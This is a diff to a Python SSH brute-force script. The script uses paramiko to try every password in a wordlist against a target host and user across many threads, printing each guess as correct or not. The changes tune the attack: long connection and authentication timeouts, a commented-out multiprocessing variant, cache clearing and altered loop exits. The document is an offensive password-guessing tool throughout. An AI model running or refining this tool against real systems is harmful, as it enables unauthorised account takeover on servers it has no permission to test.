@@ -1,4 +1,5 @@
 from threading import Thread
+# from multiprocessing import Process
 import argparse,sys,queue,linecache,time
 
 import paramiko
@@ -27,9 +28,10 @@ class BruteForce:
             host_t = self.host
             user_t = self.user
             thread = Thread(target=self.bruteforce, args=(filename_t,self.numberlines,self.numberlines+lines,host_t,user_t,self.q),daemon=True)
+            # thread = Process(target=self.bruteforce, args=(filename_t,self.numberlines,self.numberlines+lines,host_t,user_t,self.q),daemon=True)
             self.numberlines += lines
-            self.thread_list.append(thread)
             thread.start()
+            self.thread_list.append(thread)
         return self.thread_list
 
     def bruteforce(self,filename_t,numberlines,lines,host_t,user_t,q):
@@ -39,7 +41,7 @@ class BruteForce:
             try:
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(policy_t)
-                client.connect(host_t, username=user_t, password=line)
+                client.connect(host_t, username=user_t, password=line,banner_timeout=84600,timeout=84600,auth_timeout=84600)
                 q.put(line)   
                 print(f'[+] {line} is correct')
                 client.close()
@@ -48,6 +50,7 @@ class BruteForce:
                 print(f'[-] {line} is not correct')
             finally:
                 client.close()
+        linecache.clearcache()
 
     def get_filelines(self,filename):
         lens = len(linecache.getlines(self.filename))
@@ -93,6 +96,6 @@ if __name__ == '__main__':
                 if thread_join == thread_num:
                     sys.exit(f'[!] Brute force finished\n[!] SSH password not found\nTime: {get_time(start_time,time.time())}')
             else:
-                continue
+                break
         thread_join = 0
         
